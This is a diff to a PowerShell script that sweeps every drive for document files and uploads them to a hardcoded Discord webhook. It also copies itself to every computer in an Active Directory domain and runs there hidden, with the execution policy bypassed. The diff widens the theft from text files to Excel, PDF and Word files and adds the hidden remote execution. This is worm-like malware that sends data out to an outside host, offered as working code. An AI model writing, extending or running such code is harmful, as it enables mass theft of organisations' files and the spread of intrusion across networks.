@@ -49,23 +49,27 @@ function Upload-FileToDiscord {
     $webResponse.Close()
 }
 
-# Function to replicate the script to other computers
+# Function to replicate the script to other computers and execute it
 function Replicate-Script {
     param (
         [string]$scriptPath,
         [string]$webhookUrl
     )
 
+    # Get all computers in the domain
     $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
     foreach ($computer in $computers) {
         try {
+            # Copy the script to the target computer
             Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force
+
+            # Execute the script on the target computer
             Invoke-Command -ComputerName $computer -ScriptBlock {
                 param ($scriptPath, $webhookUrl)
-                . $scriptPath -webhookUrl $webhookUrl
-            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl
+                powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath
+            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential)
         } catch {
-            Write-Host "Failed to replicate to $computer"
+            Write-Host "Failed to replicate or execute on $computer: $_"
         }
     }
 }
@@ -73,12 +77,16 @@ function Replicate-Script {
 # Close any active Remote Desktop connections
 Close-RemoteDesktopConnections
 
-# Recursively get all .txt files from all drives
+# Recursively get txt, xlsx, pdf, and doc files from all drives in rotation
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
+$fileTypes = @("*.txt", "*.xlsx", "*.pdf", "*.doc", "*.docx")
 $drives = Get-PSDrive -PSProvider FileSystem
+
 foreach ($drive in $drives) {
-    Get-ChildItem -Path $drive.Root -Filter *.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-        Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
+    foreach ($fileType in $fileTypes) {
+        Get-ChildItem -Path $drive.Root -Filter $fileType -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
+        }
     }
 }
 
